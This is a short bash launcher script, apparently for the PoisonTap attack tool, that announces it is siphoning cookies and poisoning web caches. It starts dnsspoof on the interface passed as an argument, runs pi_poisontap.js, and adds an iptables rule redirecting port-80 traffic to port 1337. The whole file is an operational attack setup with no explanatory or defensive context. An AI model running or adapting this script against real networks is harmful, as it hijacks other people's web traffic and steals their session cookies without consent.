#!/bin/bash

echo 'running siphons cookies and web cache poisoning'

[[ $(pgrep dnsspoof) = '' ]] && {
  dnsspoof -i "$1" port 53
}

[[ $(pgrep pi_poisontap.js) = '' ]] && {
  nodejs ~/src/poisontap/pi_poisontap.js
}

[[ $(iptables -t nat -vnL PREROUTING | grep "$1" | grep 1337) = '' ]] && {
  iptables -t nat -A PREROUTING -i "$1" -p tcp --dport 80 -j REDIRECT --to-port 1337
}
